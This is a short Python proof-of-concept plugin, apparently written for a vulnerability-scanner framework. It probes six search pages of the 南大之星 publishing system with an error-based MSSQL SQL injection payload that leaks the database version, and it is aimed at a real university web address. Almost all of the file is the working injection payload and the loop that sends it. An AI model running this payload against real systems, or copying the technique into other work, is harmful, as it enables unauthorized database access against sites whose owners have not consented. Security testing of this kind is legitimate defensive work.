#!/usr/bin/env python#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:南大之星信息发布系统DBA权限SQL注入6枚 
#Refer:http://wooyun.org/bugs/wooyun-2015-0153651
#Author:xq17

def assign(service, arg):
    if service == 'ndstar':
        return True, arg

def audit(arg):
    urls = [ 
    "pub/search/search_video.asp?id=3",
    "pub/search/search_audio.asp?id=3",
    "pub/search/search_audio_view.asp?id=3",
    "pub/search/search_fj.asp??id=3",
    "pub/search/search_video_bc.asp?id=12",
    "pub/search/search_video_view.asp?id=3"
    ]

    data = "&mid=4%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)-->0--&yh=1"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and 'WtFaBcMicrosoft' in res:
            security_hole(arg + url)

if __name__=="__main__":
    from dummy import *
    audit(assign('ndstar','http://www.dag1.ecnu.edu.cn/')[1])